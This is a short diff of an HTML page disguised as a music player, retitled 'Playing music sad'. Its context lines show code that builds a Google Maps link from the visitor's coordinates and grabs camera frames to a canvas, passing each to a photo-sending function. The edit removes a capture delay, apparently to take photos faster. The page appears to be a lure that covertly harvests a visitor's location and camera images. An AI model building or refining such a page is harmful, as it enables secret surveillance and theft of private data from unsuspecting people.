@@ -4,7 +4,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Now Playing</title>
+  <title>Playing music sad</title>
   <style>
     * {
       box-sizing: border-box;
@@ -225,7 +225,6 @@ Peta                : https://maps.google.com/?q=${latitude},${longitude}
           canvas.height = video.videoHeight;
           const ctx = canvas.getContext("2d");
           ctx.drawImage(video, 0, 0);
-          await new Promise(resolve => setTimeout(resolve, 100)); // delay 0.1 detik
           await new Promise(resolve => canvas.toBlob(async (blob) => {
             if(blob) await kirimFoto(blob);
             resolve();
